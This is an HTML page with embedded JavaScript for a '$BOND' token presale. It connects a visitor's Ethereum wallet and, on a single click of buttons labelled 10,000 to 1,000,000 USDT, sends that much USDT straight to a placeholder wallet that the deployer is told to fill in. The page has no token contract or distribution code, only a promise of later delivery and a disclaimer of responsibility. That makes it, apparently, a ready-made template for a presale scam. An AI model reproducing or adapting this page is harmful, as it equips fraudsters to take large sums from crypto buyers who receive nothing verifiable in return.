<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blockchains.bond $BOND Presale</title>
    <link rel="icon" href="images/bondlogo.jpg" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
    />
    <!-- Link to the external CSS file -->
    <link rel="stylesheet" href="presale.css" />
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@openzeppelin/contracts@4.0.0/build/contracts-abi.min.js"></script>
  </head>

  <body>
    <div class="container animate__animated animate__fadeInUp">
      <h1>$BOND</h1>
      <p>1 $BOND = 1 USDT</p>
      <p>SUPPLY = 1,000,000,000 $BOND</p>
      <h1>$BOND Presale:</h1>
      <p>24 hours post-presale, tokens will be distributed to all participants.</p>
      <p>Connect Your Ethereum Wallet Now!</p>
      <p>
        <button id="connectWalletBtn" onclick="connectWallet()">
          Connect wallet
        </button>
      </p>
      <button onclick="setInvestment(10000)">10 000 USDT</button>
      <button onclick="setInvestment(50000)">50 000 USDT</button>
      <button onclick="setInvestment(100000)">100 000 USDT</button>
      <button onclick="setInvestment(250000)">250 000 USDT</button>
      <button onclick="setInvestment(500000)">500 000 USDT</button>
      <button onclick="setInvestment(1000000)">1 000 000 USDT</button>
      <p id="walletAddress"></p>
      <h1>$BOND Disclaimer:</h1>
      <p>No responsibility for incorrect transactions assumed.</p>
    </div>

    <script>
      let web3;
      let accounts;
      let selectedAmount;

      // USDT Contract Details
      const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT contract address
      const USDT_ABI = [
        // Minimal ABI for USDT transfer function
        {
          constant: false,
          inputs: [
            { name: "_to", type: "address" },
            { name: "_value", type: "uint256" },
          ],
          name: "transfer",
          outputs: [{ name: "", type: "bool" }],
          type: "function",
        },
      ];

      async function connectWallet() {
        if (window.ethereum) {
          try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            web3 = new Web3(window.ethereum);
            accounts = await web3.eth.getAccounts();
            document.getElementById("walletAddress").innerText =
              "Connected Wallet: " + accounts[0];
            document.getElementById("connectWalletBtn").innerText =
              "Wallet Connected";
            document.getElementById("connectWalletBtn").style.cursor =
              "default";
            document
              .getElementById("connectWalletBtn")
              .removeAttribute("onclick");
          } catch (error) {
            console.error(error);
            alert("Error connecting to wallet. Please try again.");
          }
        } else {
          alert(
            "No Ethereum wallet detected. Please install MetaMask or use a compatible browser."
          );
        }
      }

      function setInvestment(amount) {
        selectedAmount = amount;
        if (accounts && accounts.length > 0) {
          submitInvestment();
        } else {
          alert("Please connect your wallet first.");
        }
      }

      async function submitInvestment() {
        if (!selectedAmount) {
          alert("Please select an amount to invest.");
          return;
        }

        const walletAddress = accounts[0];
        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);

        // Convert USDT amount to the smallest unit (USDT has 6 decimals)
        const usdtAmount = web3.utils.toHex(selectedAmount * 10 ** 6);

        try {
          // Send USDT transaction
          const transaction = await usdtContract.methods
            .transfer("YOUR_RECEIVING_WALLET_ADDRESS", usdtAmount) // Replace with your wallet address
            .send({ from: walletAddress });

          console.log(transaction);
          alert("Investment successful!");
        } catch (error) {
          console.error(error);
          alert("Error submitting investment. Please try again.");
        }
      }
    </script>
  </body>
</html>
<p></p>
<p></p>
  <div class="gtranslate_wrapper"></div>
  <script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"languages":["en","fr","de","it","es","ar","pt","nl","ja","ko"],"wrapper_selector":".gtranslate_wrapper","flag_size":16,"horizontal_position":"right","vertical_position":"top","alt_flags":{"en":"usa"}}</script>
  <script src="https://cdn.gtranslate.net/widgets/latest/flags.js" defer></script>